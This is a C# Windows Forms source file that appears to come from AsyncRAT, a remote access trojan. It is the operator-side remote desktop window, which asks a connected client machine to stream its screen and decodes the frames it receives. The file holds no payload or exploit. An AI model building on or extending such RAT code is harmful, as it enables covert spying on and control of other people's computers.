using StreamLibrary;
using StreamLibrary.UnsafeCodecs;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using AsyncRAT_Sharp.Sockets;
using AsyncRAT_Sharp.MessagePack;

namespace AsyncRAT_Sharp.Forms
{
    public partial class RemoteDesktop : Form
    {
        public RemoteDesktop()
        {
            InitializeComponent();
        }

        public Form1 F { get; set; }
        internal Clients C { get; set; }
        public bool Active { get; set; }
        public int FPS = 0;
        public Stopwatch sw = Stopwatch.StartNew();
        public Stopwatch RenderSW = Stopwatch.StartNew();
        public IUnsafeCodec decoder = new UnsafeStreamCodec(80);

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (!C.Client.Connected) this.Close();
        }

        private void RemoteDesktop_Activated(object sender, EventArgs e)
        {
            if (Active == false)
            {
                Active = true;
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                msgpack.ForcePathObject("Option").AsString = "true";
                C.BeginSend(msgpack.Encode2Bytes());
                decoder = new UnsafeStreamCodec(60);
            }
        }

        private void RemoteDesktop_Deactivate(object sender, EventArgs e)
        {
            if (Active == true) Active = false;
        }
    }
}
